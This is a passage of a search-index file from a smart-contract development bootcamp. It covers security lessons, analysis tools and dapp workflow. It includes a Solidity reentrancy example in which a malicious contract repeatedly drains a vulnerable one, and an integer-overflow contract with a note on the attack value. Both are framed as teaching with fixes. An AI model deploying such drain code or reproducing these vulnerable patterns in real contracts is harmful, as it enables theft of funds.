withdraw ( 1 ether ) ; } function getBalance () view public returns ( uint ) { return address ( this ) . balance ; } fallback () payable external { if ( address ( vulnerableContract ) . balance > 1 ether ) { vulnerableContract . withdraw ( 1 ether ) ; } } }","title":"Index"},{"location":"S03-smart-contracts/M6-security/L2d-reentrancy-attack/#reentrancy-example","text":"This set of contracts shows what a reentrancy attack ( SWC-107 ) looks like. pragma solidity 0 . 8 . 2 ; // Example Reentrancy Attack contract VulnerableContract { mapping ( address => uint ) public balances ; function deposit () public payable { require ( msg . value > 1 ) ; balances [ msg . sender ] += msg . value ; } function withdraw ( uint _amount ) public { require ( balances [ msg . sender ] >= _amount , \"Not enough balance!\" ) ; msg . sender . call . value ( _amount )( \"\" ) ; balances [ msg . sender ] -= _amount ; } function getBalance () view public returns ( uint ) { return address ( this ) . balance ; } fallback () payable external {} } contract MaliciousContract { VulnerableContract vulnerableContract = VulnerableContract ( 0 x08970FEd061E7747CD9a38d680A601510CB659FB ) ; function deposit () public payable { vulnerableContract . deposit . value ( msg . value )() ; } function withdraw () public { vulnerableContract . withdraw ( 1 ether ) ; } function getBalance () view public returns ( uint ) { return address ( this ) . balance ; } fallback () payable external { if ( address ( vulnerableContract ) . balance > 1 ether ) { vulnerableContract . withdraw ( 1 ether ) ; } } }","title":"Reentrancy Example"},{"location":"S03-smart-contracts/M6-security/L2e-int-under-over-attack/","text":"Integer Over / Underflow Note: Due to SafeMath being included in Solidity 0.8.x, the likelihood of you writing an integer under or overflow is extremely unlikely. However, a number of contracts still exist with this attack vector and it's good to know about. But, again, the inclusion of SafeMath helps significantly protect against this attack vector. This contract shows what an integer overflow vulnerability ( SWC-101 ) looks like. In this VulnerableContract the lockTime is manipulable by the currentInvestor. The maximum value for the lockTime is 4294967295 because it is declared type uint32 (and 2^32 = 4294967296). If the currentInvestor attempts to set the value above 4294967295, it will overflow and start counting back at 0. pragma solidity ^ 0 . 5 . 0 ; // Example Integer Overflow and Underflow contract VulnerableContract { uint MINIMUM_INVESTMENT = 50 ether ; uint32 INITIAL_LOCK_TIME = 2592000 ; // 30 days in seconds address payable currentInvestor ; uint investmentTimestamp ; uint32 public lockTime = INITIAL_LOCK_TIME ; function increaseLockTime ( uint32 _seconds ) public { require ( msg . sender == currentInvestor ) ; // uint32 max is 4294967295 seconds . Attack passing 4292375295 lockTime += _seconds ; } function invest () public payable { require ( currentInvestor == address ( 0 )) ; require ( msg . value >= MINIMUM_INVESTMENT ) ; currentInvestor = msg . sender ; investmentTimestamp = now ; } function withdrawWithProfit () public { require ( msg . sender == currentInvestor ) ; require ( now - investmentTimestamp >= lockTime ) ; uint profit = 1 ether + lockTime * 1 wei ; currentInvestor . transfer ( MINIMUM_INVESTMENT + profit ) ; currentInvestor = address ( 0 ) ; lockTime = INITIAL_LOCK_TIME ; } function getBalance () view public returns ( uint ) { return address ( this ) . balance ; } function () external payable {} } This type of attack is easily avoidable by using a SafeMath library such as this , that provides safety checks and will revert on error. The SafeMath library now ships with Solidity as of 0.8.x, so you do not have to include it if you're working with a compiler on 0.8.x except in very specific cases mentioned here .","title":"Index"},{"location":"S03-smart-contracts/M6-security/L2e-int-under-over-attack/#integer-over-underflow","text":"Note: Due to SafeMath being included in Solidity 0.8.x, the likelihood of you writing an integer under or overflow is extremely unlikely. However, a number of contracts still exist with this attack vector and it's good to know about. But, again, the inclusion of SafeMath helps significantly protect against this attack vector. This contract shows what an integer overflow vulnerability ( SWC-101 ) looks like. In this VulnerableContract the lockTime is manipulable by the currentInvestor. The maximum value for the lockTime is 4294967295 because it is declared type uint32 (and 2^32 = 4294967296). If the currentInvestor attempts to set the value above 4294967295, it will overflow and start counting back at 0. pragma solidity ^ 0 . 5 . 0 ; // Example Integer Overflow and Underflow contract VulnerableContract { uint MINIMUM_INVESTMENT = 50 ether ; uint32 INITIAL_LOCK_TIME = 2592000 ; // 30 days in seconds address payable currentInvestor ; uint investmentTimestamp ; uint32 public lockTime = INITIAL_LOCK_TIME ; function increaseLockTime ( uint32 _seconds ) public { require ( msg . sender == currentInvestor ) ; // uint32 max is 4294967295 seconds . Attack passing 4292375295 lockTime += _seconds ; } function invest () public payable { require ( currentInvestor == address ( 0 )) ; require ( msg . value >= MINIMUM_INVESTMENT ) ; currentInvestor = msg . sender ; investmentTimestamp = now ; } function withdrawWithProfit () public { require ( msg . sender == currentInvestor ) ; require ( now - investmentTimestamp >= lockTime ) ; uint profit = 1 ether + lockTime * 1 wei ; currentInvestor . transfer ( MINIMUM_INVESTMENT + profit ) ; currentInvestor = address ( 0 ) ; lockTime = INITIAL_LOCK_TIME ; } function getBalance () view public returns ( uint ) { return address ( this ) . balance ; } function () external payable {} } This type of attack is easily avoidable by using a SafeMath library such as this , that provides safety checks and will revert on error. The SafeMath library now ships with Solidity as of 0.8.x, so you do not have to include it if you're working with a compiler on 0.8.x except in very specific cases mentioned here .","title":"Integer Over / Underflow"},{"location":"S03-smart-contracts/M6-security/L3-sc-checklist/","text":"Title","title":"Index"},{"location":"S03-smart-contracts/M6-security/L3-sc-checklist/#title","text":"","title":"Title"},{"location":"S03-smart-contracts/M6-security/L4-tdd-and-truffle-tests/","text":"Title","title":"Index"},{"location":"S03-smart-contracts/M6-security/L4-tdd-and-truffle-tests/#title","text":"","title":"Title"},{"location":"S03-smart-contracts/M6-security/L5-intro-to-dili/","text":"Security: Introduction to Diligence As we've drilled into your head many times now, smart contract development is different than traditional software development: Smart contract development is new and it is constantly changing. Smart contracts are immutable. They cannot be modified (only re-deployed). High cost of failure. More similar to hardware and financial services programming. Smart contracts information is public and anyone can call your public functions. We've gone over many of the common attack vectors, discussed smart contract best practices and showed you design patterns to increase security for your distributed applications. Much of this information came from the brilliant minds at Diligence, the auditing and smart contract security arm of ConsenSys. Diligence provides audits for the largest names in the blockchain sector, including Aave, 0x, Covantis, Aragon, Omisego, Horizon and more. Along with audits, Diligence also provides automated security analysis through two main tools: MythX and Scribble . MythX MythX is a smart contract security service for Ethereum built by ConsenSys Diligence. As part of the bootcamp, we have gotten a free month of the developer plan for every student from the ConsenSys Diligence team. Promo code = ESvxp6CQ Steps to Get Started Go to https://mythx.io/ Click the \u201c sign up \u201dbutton Complete the registration form. You will then have an option to choose a plan. Please select \u201c Try MythX & Buy Scans \u201d This will allow you to set up a MythX account with no charge. Go to the dashboard Billing tab click \" Buy a pack of 3 scans today for $9.99 \" Enter your promo code x9naNrvz in the box provided and proceed through check with no charge Scribble Diligence also provides another analysis tool called Scribble, which is \"Fuzzing as a Service.\" Fuzzing is a general computer security automation method that essentially runs millions of tests against your codebase. There's a bit of structure involved, but the overall concept is applicable to all other computer security industries. In the following lesson, Joran Honig will walk you through the basic concepts behind Scribble and through three exercises to help you learn how to use Scribble! Additional Material Video: Security by Design and Smart Contract Audits (Shayan Eskandari) Series: Diligence YouTube Channel Video: Shift Left and DevSecOps (Joran Honig) Talk from TruffleCon2020 where Joran goes through the concept of \"Shift Left\" as it applies to security best practices. Video: Shift Left and Automated Tooling (Joran Honig) Articles: Collection of Smart Contract Best Practices from Diligence Scribble Article: Introducing Scribble Article: Introducing Scribble Generator Article: Writing Properties \u2014 A New Approach to Testing Article: Four Effective Strategies To Come Up with Scribble Annotations","title":"Security: Introduction to Diligence"},{"location":"S03-smart-contracts/M6-security/L5-intro-to-dili/#security-introduction-to-diligence","text":"As we've drilled into your head many times now, smart contract development is different than traditional software development: Smart contract development is new and it is constantly changing. Smart contracts are immutable. They cannot be modified (only re-deployed). High cost of failure. More similar to hardware and financial services programming. Smart contracts information is public and anyone can call your public functions. We've gone over many of the common attack vectors, discussed smart contract best practices and showed you design patterns to increase security for your distributed applications. Much of this information came from the brilliant minds at Diligence, the auditing and smart contract security arm of ConsenSys. Diligence provides audits for the largest names in the blockchain sector, including Aave, 0x, Covantis, Aragon, Omisego, Horizon and more. Along with audits, Diligence also provides automated security analysis through two main tools: MythX and Scribble .","title":"Security: Introduction to Diligence"},{"location":"S03-smart-contracts/M6-security/L5-intro-to-dili/#mythx","text":"MythX is a smart contract security service for Ethereum built by ConsenSys Diligence. As part of the bootcamp, we have gotten a free month of the developer plan for every student from the ConsenSys Diligence team. Promo code = ESvxp6CQ","title":"MythX"},{"location":"S03-smart-contracts/M6-security/L5-intro-to-dili/#steps-to-get-started","text":"Go to https://mythx.io/ Click the \u201c sign up \u201dbutton Complete the registration form. You will then have an option to choose a plan. Please select \u201c Try MythX & Buy Scans \u201d This will allow you to set up a MythX account with no charge. Go to the dashboard Billing tab click \" Buy a pack of 3 scans today for $9.99 \" Enter your promo code x9naNrvz in the box provided and proceed through check with no charge","title":"Steps to Get Started"},{"location":"S03-smart-contracts/M6-security/L5-intro-to-dili/#scribble","text":"Diligence also provides another analysis tool called Scribble, which is \"Fuzzing as a Service.\" Fuzzing is a general computer security automation method that essentially runs millions of tests against your codebase. There's a bit of structure involved, but the overall concept is applicable to all other computer security industries. In the following lesson, Joran Honig will walk you through the basic concepts behind Scribble and through three exercises to help you learn how to use Scribble!","title":"Scribble"},{"location":"S03-smart-contracts/M6-security/L5-intro-to-dili/#additional-material","text":"Video: Security by Design and Smart Contract Audits (Shayan Eskandari) Series: Diligence YouTube Channel Video: Shift Left and DevSecOps (Joran Honig) Talk from TruffleCon2020 where Joran goes through the concept of \"Shift Left\" as it applies to security best practices. Video: Shift Left and Automated Tooling (Joran Honig) Articles: Collection of Smart Contract Best Practices from Diligence","title":"Additional Material"},{"location":"S03-smart-contracts/M6-security/L5-intro-to-dili/#scribble_1","text":"Article: Introducing Scribble Article: Introducing Scribble Generator Article: Writing Properties \u2014 A New Approach to Testing Article: Four Effective Strategies To Come Up with Scribble Annotations","title":"Scribble"},{"location":"S03-smart-contracts/M6-security/L6-scribble/","text":"This is currently a video on the LMS","title":"Index"},{"location":"S03-smart-contracts/M6-security/L7-other-security-options/","text":"Other Security Options Outside of the tools we've provided so far, there are other great security analysis tools: Tools OpenZeppelin Defender Less of a security tool per se and more like an operating system or dashboard for your smart contracts. This allows you to monitor your smart contracts, respond to exploits or bugs by adjusting access control, and private transaction relayers. Slither A static analysis framework for Solidity built by the auditing firm Trail of Bits. It is written in Python, is open-source and you can read more about it here. Manticore \"A symbolic execution tool for analysis of smart contracts and binaries\" as well as WASM modules. Also built by Trail of Bits! Read more here. Ethersplay An EVM Disassembler which takes as input raw EVM bytecode (your contract you're deploying) and analyzes it at the Assembly level. It can provide a flow graph of all the functions in the bytecode. Another tool from Trail of Bits, it also can let you know where Manticore has scanned. Echidna A fuzzer like Scribble. It is \"a Haskell program designed for fuzzing/property-based testing of Ethereum smarts contracts. It uses sophisticated grammar-based fuzzing campaigns based on a contract ABI to falsify user-defined predicates or Solidity assertions.\" ( source ) Also from Trail of Bits. Learning Blocksec CTFs An amazing collection of blockchain Capture The Flag (CTF) exercises and write-ups Article: Ethereum Quirks and Vulnerabilities Discussion around attack vectors on Ethereum Ethernaut Phenomenal CTF / Wargame series of exercises for blockchain security. Be sure to checkout the EthernautDAO, organized in part by the designing of Ethernaut. DamnVulnerableDeFi A DeFi-oriented CFT Capture the Ether Another blockchain CTF, written by Steve Marx CipherShastra Another CTF-style learning challenge Diligence Public Audits, OpenZeppelin Audits Another great way to learn to audit is to read reports from the best organizations doing them. Trail of Bits is not blockchain-specific, but you can see their public security \"reviews\" here. Audits Thread: Before an Audit @Tincho, a security researcher at OpenZeppelin, walks through the things you absolutely should do before submitting your code for an audit Code 423n4 \"A community-driven approach to competitive smart contract audits.\" A great way to get into auditing \u2014 no experience necessary. Immunefi A collection of bug bounties for blockchain projects anyone can contribute. Article: Introducing Solidify (Coinbase) We haven't gotten a chance to try this one, but Coinbase offering a new tool for smart contract analysis. This is not an endorsement of this, just letting you know it exists!","title":"Index"},{"location":"S03-smart-contracts/M6-security/L7-other-security-options/#other-security-options","text":"Outside of the tools we've provided so far, there are other great security analysis tools:","title":"Other Security Options"},{"location":"S03-smart-contracts/M6-security/L7-other-security-options/#tools","text":"OpenZeppelin Defender Less of a security tool per se and more like an operating system or dashboard for your smart contracts. This allows you to monitor your smart contracts, respond to exploits or bugs by adjusting access control, and private transaction relayers. Slither A static analysis framework for Solidity built by the auditing firm Trail of Bits. It is written in Python, is open-source and you can read more about it here. Manticore \"A symbolic execution tool for analysis of smart contracts and binaries\" as well as WASM modules. Also built by Trail of Bits! Read more here. Ethersplay An EVM Disassembler which takes as input raw EVM bytecode (your contract you're deploying) and analyzes it at the Assembly level. It can provide a flow graph of all the functions in the bytecode. Another tool from Trail of Bits, it also can let you know where Manticore has scanned. Echidna A fuzzer like Scribble. It is \"a Haskell program designed for fuzzing/property-based testing of Ethereum smarts contracts. It uses sophisticated grammar-based fuzzing campaigns based on a contract ABI to falsify user-defined predicates or Solidity assertions.\" ( source ) Also from Trail of Bits.","title":"Tools"},{"location":"S03-smart-contracts/M6-security/L7-other-security-options/#learning","text":"Blocksec CTFs An amazing collection of blockchain Capture The Flag (CTF) exercises and write-ups Article: Ethereum Quirks and Vulnerabilities Discussion around attack vectors on Ethereum Ethernaut Phenomenal CTF / Wargame series of exercises for blockchain security. Be sure to checkout the EthernautDAO, organized in part by the designing of Ethernaut. DamnVulnerableDeFi A DeFi-oriented CFT Capture the Ether Another blockchain CTF, written by Steve Marx CipherShastra Another CTF-style learning challenge Diligence Public Audits, OpenZeppelin Audits Another great way to learn to audit is to read reports from the best organizations doing them. Trail of Bits is not blockchain-specific, but you can see their public security \"reviews\" here.","title":"Learning"},{"location":"S03-smart-contracts/M6-security/L7-other-security-options/#audits","text":"Thread: Before an Audit @Tincho, a security researcher at OpenZeppelin, walks through the things you absolutely should do before submitting your code for an audit Code 423n4 \"A community-driven approach to competitive smart contract audits.\" A great way to get into auditing \u2014 no experience necessary. Immunefi A collection of bug bounties for blockchain projects anyone can contribute. Article: Introducing Solidify (Coinbase) We haven't gotten a chance to try this one, but Coinbase offering a new tool for smart contract analysis. This is not an endorsement of this, just letting you know it exists!","title":"Audits"},{"location":"S04-developer-tooling/M1-intro/L1-users-in-mental-model/","text":"Where Do Users Fit in Our Mental Model? Now that we've gone through the smart contract section and have a good understanding of how we can deploy self-executing code to a blockchain network, it's time to turn to the users of our applications. In particular, we're going to examine how users that are interacting with our smart contracts deployed on our favorite blockchain fit into the mental model we've been building After we've looked at this, we're going to start building an understanding of the smart contract development workflow and how it can be changed or altered based on the kind of application we're developing and the user we're targeting. Users in the Mental Model The users represent a potential new element, that is to say the non-blockchain world. In an ideal world, all your users know how to use blockchain, are loyal degens on Crypto-Twitter, and are already onboarded to the blockchain world. if only it were so easy! In reality, we have users located on a spectrum of abilities, understanding and desires. We'll build this out more as we go, but for sake of simplicity, in this section we will emphasize how the overwhelming majority of your blockchain users will interact with your application: through a JavaScript API. Below is a diagram illustrating how the typical user interacts with a distributed application (we're using Ethereum as the public blockchain, but you can imagine it to be any general public blockchain): On the left, we see a user interacting with a frontend interface, usually a website on a traditional web browser their device, either on mobile or desktop. That website is powered primarily by \"Web 2.0\" technology (browser connects to a server, has responsive layout, has interactive JavaScript interface). However, the website has two main elements powered by blockchain. The first is any data the website is reading from the blockchain. This might be recent transactions, current user balance, current block number on the network, etc. The second is the ability for the user to submit their own transactions to the blockchain from the website (\"writing\" to the network). This is made possible through a concert of three aspects: * A Web 3 JavaScript library (web3.js or ethers.js, for example) * A cryptowallet which can safely handle a user's private key, allowing them to sign transactions (MetaMask, in this case) * Code deployed by you, the developer, to your website which constructs pre-formatted transactions, targeting your deployed smart contract, specifically a function in its ABI. You, the developer of the distributed application, have coded in certain transaction parameters to be filled in by the user. These transactions parameters are targeting a deployed smart contract's ABI. That transaction will then be properly signed by the cryptowallet then submitted to the blockchain network. In this case, MetaMask will submit our transaction using an Infura endpoint. The image below shows a simplified version of the workflow we just described: Let's return to our blockchain network and our smart contract model to see how this user workflow comes into play. Specifically, let's see how that pre-formatted transaction code is submitted to the network and propagates a new network state. The image above shows how we are combining the two mental models we've been working with. On the left-hand side, we see the user has their transaction, which has been pre-formatted by the application developer but populated and authorized by the user. To the right, we see the basic blockchain network. Effectively, when the user submits their transaction, they do so as a node in the network broadcasting any other transaction. It will be propagated throughout the network (each node that receives it checks its digital signature validity before passing it on) and eventually become part of the emergent \"mempool\" of unmined transactions. Once it is mined, we can then see how it will affect global network state. Assuming the user's transaction is valid (including proper gas fees, etc.), it will be included into a block by a miner. That miner will then propagate the block out into the network, requiring all the other nodes in the network to check the block and then incorporate the state changes implied by the transactions included in that block. Below, we see our user's transaction being processed by another node who has received it in a block: As each node in the network processes the block containing our user's transaction, the new global network state will begin to emerge that includes the state changes caused by our user's transaction (We're showing that network state change below with a checkmark). Since submitting the transaction, the user's website interface has been using MetaMask as its network gateway. It's looking specifically for the transaction's \"confirmation\" (both inclusion in a mined block as well as that block's propagation). Once it detects the transactions confirmation, the website interface will be updated to reflect that state change and let the user know their transaction has \"gone through\". Conclusion Now that we have an understanding of where the user sits in our mental model, we're faced with a new set of challenges. Mainly, how do we integrate all these different elements of development so our user's have a seamless exeperience? In the next few sections, we're going to show you how you can begin to approach this. In the process, you will become intimately acquainted with developer tooling that will give you confidence in approaching this tall task. Additional Material Article: Building for the Blockchain Dated material but has a nice overview of the paradigm shift taking place between Web 2 and Web 3. Article: Want to Understand Blockchain? You Need to Understand State Overview discussing the integration of state from a JavaScript framework perspective to the blockchain public network perspective.","title":"Index"},{"location":"S04-developer-tooling/M1-intro/L1-users-in-mental-model/#where-do-users-fit-in-our-mental-model","text":"Now that we've gone through the smart contract section and have a good understanding of how we can deploy self-executing code to a blockchain network, it's time to turn to the users of our applications. In particular, we're going to examine how users that are interacting with our smart contracts deployed on our favorite blockchain fit into the mental model we've been building After we've looked at this, we're going to start building an understanding of the smart contract development workflow and how it can be changed or altered based on the kind of application we're developing and the user we're targeting.","title":"Where Do Users Fit in Our Mental Model?"},{"location":"S04-developer-tooling/M1-intro/L1-users-in-mental-model/#users-in-the-mental-model","text":"The users represent a potential new element, that is to say the non-blockchain world. In an ideal world, all your users know how to use blockchain, are loyal degens on Crypto-Twitter, and are already onboarded to the blockchain world. if only it were so easy! In reality, we have users located on a spectrum of abilities, understanding and desires. We'll build this out more as we go, but for sake of simplicity, in this section we will emphasize how the overwhelming majority of your blockchain users will interact with your application: through a JavaScript API. Below is a diagram illustrating how the typical user interacts with a distributed application (we're using Ethereum as the public blockchain, but you can imagine it to be any general public blockchain): On the left, we see a user interacting with a frontend interface, usually a website on a traditional web browser their device, either on mobile or desktop. That website is powered primarily by \"Web 2.0\" technology (browser connects to a server, has responsive layout, has interactive JavaScript interface). However, the website has two main elements powered by blockchain. The first is any data the website is reading from the blockchain. This might be recent transactions, current user balance, current block number on the network, etc. The second is the ability for the user to submit their own transactions to the blockchain from the website (\"writing\" to the network). This is made possible through a concert of three aspects: * A Web 3 JavaScript library (web3.js or ethers.js, for example) * A cryptowallet which can safely handle a user's private key, allowing them to sign transactions (MetaMask, in this case) * Code deployed by you, the developer, to your website which constructs pre-formatted transactions, targeting your deployed smart contract, specifically a function in its ABI. You, the developer of the distributed application, have coded in certain transaction parameters to be filled in by the user. These transactions parameters are targeting a deployed smart contract's ABI. That transaction will then be properly signed by the cryptowallet then submitted to the blockchain network. In this case, MetaMask will submit our transaction using an Infura endpoint. The image below shows a simplified version of the workflow we just described: Let's return to our blockchain network and our smart contract model to see how this user workflow comes into play. Specifically, let's see how that pre-formatted transaction code is submitted to the network and propagates a new network state. The image above shows how we are combining the two mental models we've been working with. On the left-hand side, we see the user has their transaction, which has been pre-formatted by the application developer but populated and authorized by the user. To the right, we see the basic blockchain network. Effectively, when the user submits their transaction, they do so as a node in the network broadcasting any other transaction. It will be propagated throughout the network (each node that receives it checks its digital signature validity before passing it on) and eventually become part of the emergent \"mempool\" of unmined transactions. Once it is mined, we can then see how it will affect global network state. Assuming the user's transaction is valid (including proper gas fees, etc.), it will be included into a block by a miner. That miner will then propagate the block out into the network, requiring all the other nodes in the network to check the block and then incorporate the state changes implied by the transactions included in that block. Below, we see our user's transaction being processed by another node who has received it in a block: As each node in the network processes the block containing our user's transaction, the new global network state will begin to emerge that includes the state changes caused by our user's transaction (We're showing that network state change below with a checkmark). Since submitting the transaction, the user's website interface has been using MetaMask as its network gateway. It's looking specifically for the transaction's \"confirmation\" (both inclusion in a mined block as well as that block's propagation). Once it detects the transactions confirmation, the website interface will be updated to reflect that state change and let the user know their transaction has \"gone through\".","title":"Users in the Mental Model"},{"location":"S04-developer-tooling/M1-intro/L1-users-in-mental-model/#conclusion","text":"Now that we have an understanding of where the user sits in our mental model, we're faced with a new set of challenges. Mainly, how do we integrate all these different elements of development so our user's have a seamless exeperience? In the next few sections, we're going to show you how you can begin to approach this. In the process, you will become intimately acquainted with developer tooling that will give you confidence in approaching this tall task.","title":"Conclusion"},{"location":"S04-developer-tooling/M1-intro/L1-users-in-mental-model/#additional-material","text":"Article: Building for the Blockchain Dated material but has a nice overview of the paradigm shift taking place between Web 2 and Web 3. Article: Want to Understand Blockchain? You Need to Understand State Overview discussing the integration of state from a JavaScript framework perspective to the blockchain public network perspective.","title":"Additional Material"},{"location":"S04-developer-tooling/M1-intro/L2-features-of-dapp-dev/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S04-developer-tooling/M1-intro/L2-features-of-dapp-dev/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S04-developer-tooling/M1-intro/L3-trad-vs-dapp-dev/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S04-developer-tooling/M1-intro/L3-trad-vs-dapp-dev/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S04-developer-tooling/M1-intro/L4-ag-dev-workflow/","text":"Blockchain Agnostic Developer Workflow It's no surprise by now that, in this course, we want to give you frameworks to help you approach the complicated business of blockchain development. In this section, we're hoping to give you a sense of the general workflow you'll be doing as a developer while developing a distributed application (\"dapp\" or smart contract + interface) on any blockchain. Note: This is not the workflow of a protocol designer, which is a more traditional project-based work environment based on the development language Lifecycle of a Project Let's see the overall lifecycle of a dapp project: Perhaps the most important work you can do as a developer is the first step: Determine the scope and goals of your project. This does not require any code at all, but it will save you so much time in the future. It's essentially creating the roadmap for your application and, when things get complicated, you'll be able to refer back to it for clarity. (This step should be familiar as the first exercise in the course was for you to do this step for your final project!) Next comes the Architectural and Technical Design : Sketching out the technical parameters of your project. What will your smart contract function parameters look like? Where will you do storage? How will you divide on-chain and off-chain logic? If your project involves others, how will you implement governance? How do you plan to scale? Next is the Development phase, which is typically what people think the only phase. Please note that this is the third step in building a project (Planning is so important)! We'll drill deeper into this step later in the section, but it's primarily the building and testing of your smart contract and interface. In this step, you'll leverage framework development tools, like Truffle or Hardhat, as well as testing tools, like testing suites and testnets. You'll also be referring to the notes you've made in the previous two steps, being sure to stay within the guidelines you made for yourself. Next comes Security Audit. We've already heard about Diligence and security tools such as MythX, Scribble, Slither or Manticore. For projects that could potentially hold enormous value this step is critical and should not be overlooked. It can sometimes be challenging to find a team or project to audit your code, but it is worth the effort considering the potential downside! Simultaneous with an audit, you might be running the next step, Bug Bounty and Community, meaning somehow starting to ask your community to test-drive your project. Note, this is before an official, version 1.0 release. Last, after all these steps, is the Launch . You may have already stealthily deployed your contract, assuming you've done all the testing and auditing, but this is where you announce the interface and let folks know that it's ready to go! As we'll see next, in some ways your work has just begun, but at least you've gotten your project launched into the world! Developer Tooling We're now going to drill into the Development phase mentioned above. This is probably what we all think of when we think about developing application for the blockchain. Here's a simplified oveview of what a development flow looks like at the beginning of a project: Here we see the developer (you) working mainly from their code editor, in which they'll have both the smart contracts and whatever frontend interface they're working on. The code editor will be stocked with the most helpful general extensions as well as specific smart contract extensions, such as the Solidity extension for VSCode as well as tools to help with gas estimation or contract sizing. Next, the developer will have a framework that they're using to deploy the smart contract and interface. In the image above, the developer is using Truffle to build their contracts, hold the build artifacts, run tests and deploy to a testnet. There are other options as well, such as Hardhat , Scaffold-Eth , and Brownie , to name some of the more popular ones. The developers will be then having some private testnet tool they're using to deploy the smart contract in the early stages. This will be Ganache for us, since we're using Truffle. As we continue to become more confident in our development process, we may want to deploy to a public testnet. For this, we will use either an Ethereum node we have on our machine or we'll use a gateway service like Infura , which will allow us to easily deploy to an Ethereum testnet, Ethereum mainnet, or even networks like Polygon, Arbitrum or Optimism. (If we're starting to lose you, don't worry we'll cover all these things later in the course!) .env File One thing that seems trivial but is incredibly important is the .env file for your project. These are the local environmental variables that allow you to deploy your application to the public blockchain network. It also is the best way to ensure you don't expose your private keys or any other sensitive information when you're developing. Particularly when you're pushing material to a git repository, it's easy for folks to forget they've included sensitive information. There are definitely bots that are continually scanning GitHub for private keys that will immediately be compromised. Please read this article about how to keep your development environment safe by using a .env file and other essential techniques! Advanced Developer Tooling As you become more familiar with blockchain development and as your project grows, so will your toolset and workflow. Below is a diagram showing a more expansive development lifecycle that includes auditing, scaling, monitoring and advanced onboarding of users: (We're using ConsenSys products here mainly for reference, since we've discussed many of them so far.) We'll get into these tools more but it's a bit beyond the scope of this lesson. In the next few sections, however, you'll become more familiar with the tools and mechanisms shown here. Additional Materials Remix Interface The original IDE for Ethereum! Well, probably not the original, but still the best first place to go to start Solidity development. Basic Training: Code Editors, VSCode Extensions I know, I know, you're super sick of hearing about Basic Training. Fair! But you should be sure to install all the VSCode extensions in this section of Basic Training, since it will help with development! Tutorial: Using an .env file to keep your secrets safe Essential reading! Good Extensions to Know About Hardhat-contract-sizer , hardhat-gas-reporter Replit Still exploring this one, but really good potential for troubleshooting code with friends. Not blockchain specific! Testing in the Twenties Really good general advice about testing! How to Setup a Solidity Project","title":"Blockchain Agnostic Developer Workflow"},{"location":"S04-developer-tooling/M1-intro/L4-ag-dev-workflow/#blockchain-agnostic-developer-workflow","text":"It's no surprise by now that, in this course, we want to give you frameworks to help you approach the complicated business of blockchain development. In this section, we're hoping to give you a sense of the general workflow you'll be doing as a developer while developing a distributed application (\"dapp\" or smart contract + interface) on any blockchain. Note: This is not the workflow of a protocol designer, which is a more traditional project-based work environment based on the development language","title":"Blockchain Agnostic Developer Workflow"},{"location":"S04-developer-tooling/M1-intro/L4-ag-dev-workflow/#lifecycle-of-a-project","text":"Let's see the overall lifecycle of a dapp project: Perhaps the most important work you can do as a developer is the first step: Determine the scope and goals of your project. This does not require any code at all, but it will save you so much time in the future. It's essentially creating the roadmap for your application and, when things get complicated, you'll be able to refer back to it for clarity. (This step should be familiar as the first exercise in the course was for you to do this step for your final project!) Next comes the Architectural and Technical Design : Sketching out the technical parameters of your project. What will your smart contract function parameters look like? Where will you do storage? How will you divide on-chain and off-chain logic? If your project involves others, how will you implement governance? How do you plan to scale? Next is the Development phase, which is typically what people think the only phase. Please note that this is the third step in building a project (Planning is so important)! We'll drill deeper into this step later in the section, but it's primarily the building and testing of your smart contract and interface. In this step, you'll leverage framework development tools, like Truffle or Hardhat, as well as testing tools, like testing suites and testnets. You'll also be referring to the notes you've made in the previous two steps, being sure to stay within the guidelines you made for yourself. Next comes Security Audit. We've already heard about Diligence and security tools such as MythX, Scribble, Slither or Manticore. For projects that could potentially hold enormous value this step is critical and should not be overlooked. It can sometimes be challenging to find a team or project to audit your code, but it is worth the effort considering the potential downside! Simultaneous with an audit, you might be running the next step, Bug Bounty and Community, meaning somehow starting to ask your community to test-drive your project. Note, this is before an official, version 1.0 release. Last, after all these steps, is the Launch . You may have already stealthily deployed your contract, assuming you've done all the testing and auditing, but this is where you announce the interface and let folks know that it's ready to go! As we'll see next, in some ways your work has just begun, but at least you've gotten your project launched into the world!","title":"Lifecycle of a Project"},{"location":"S04-developer-tooling/M1-intro/L4-ag-dev-workflow/#developer-tooling","text":"We're now going to drill into the Development phase mentioned above. This is probably what we all think of when we think about developing application for the blockchain. Here's a simplified oveview of what a development flow looks like at the beginning of a project: Here we see the developer (you) working mainly from their code editor, in which they'll have both the smart contracts and whatever frontend interface they're working on. The code editor will be stocked with the most helpful general extensions as well as specific smart contract extensions, such as the Solidity extension for VSCode as well as tools to help with gas estimation or contract sizing. Next, the developer will have a framework that they're using to deploy the smart contract and interface. In the image above, the developer is using Truffle to build their contracts, hold the build artifacts, run tests and deploy to a testnet. There are other options as well, such as Hardhat , Scaffold-Eth , and Brownie , to name some of the more popular ones. The developers will be then having some private testnet tool they're using to deploy the smart contract in the early stages. This will be Ganache for us, since we're using Truffle. As we continue to become more confident in our development process, we may want to deploy to a public testnet. For this, we will use either an Ethereum node we have on our machine or we'll use a gateway service like Infura , which will allow us to easily deploy to an Ethereum testnet, Ethereum mainnet, or even networks like Polygon, Arbitrum or Optimism. (If we're starting to lose you, don't worry we'll cover all these things later in the course!)","title":"Developer Tooling"},{"location":"S04-developer-tooling/M1-intro/L4-ag-dev-workflow/#env-file","text":"One thing that seems trivial but is incredibly important is the .env file for your project. These are the local environmental variables that allow you to deploy your application to the public blockchain network. It also is the best way to ensure you don't expose your private keys or any other sensitive information when you're developing. Particularly when you're pushing material to a git repository, it's easy for folks to forget they've included sensitive information. There are definitely bots that are continually scanning GitHub for private keys that will immediately be compromised. Please read this article about how to keep your development environment safe by using a .env file and other essential techniques!","title":".env File"},{"location":"S04-developer-tooling/M1-intro/L4-ag-dev-workflow/#advanced-developer-tooling","text":"As you become more familiar with blockchain development and as your project grows, so will your toolset and workflow. Below is a diagram showing a more expansive development lifecycle that includes auditing, scaling, monitoring and advanced onboarding of users: (We're using ConsenSys products here mainly for reference, since we've discussed many of them so far.) We'll get into these tools more but it's a bit beyond the scope of this lesson. In the next few sections, however, you'll become more familiar with the tools and mechanisms shown here.","title":"Advanced Developer 